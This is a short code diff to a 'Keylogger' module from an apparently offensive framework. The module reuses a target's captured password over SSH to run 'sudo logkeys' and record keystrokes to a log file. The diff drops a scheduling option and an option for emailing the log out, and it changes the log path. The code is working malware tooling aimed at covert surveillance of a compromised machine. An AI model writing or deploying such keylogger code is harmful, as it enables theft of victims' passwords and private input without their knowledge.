@@ -10,8 +10,6 @@ class Keylogger(Module):
         self.name = "Keylogger"
         self.command = command
         self.options = {
-                "frequency": Option("frequency", "* * * * *", "how often to run command", False),
-                "email": Option("email", "penguingeorge@gmail.com", "Email to send file to", False),
 		}
 
     def exploit(self, command):
@@ -28,7 +26,7 @@ class Keylogger(Module):
 	time.sleep(10)
 	self.target.ssh.exec_command("touch log.log")
 	time.sleep(1)
-	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S logkeys --start --output log.log")
+	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S logkeys --start --output ~/log.log")
 
 	print("Starting...")
 	
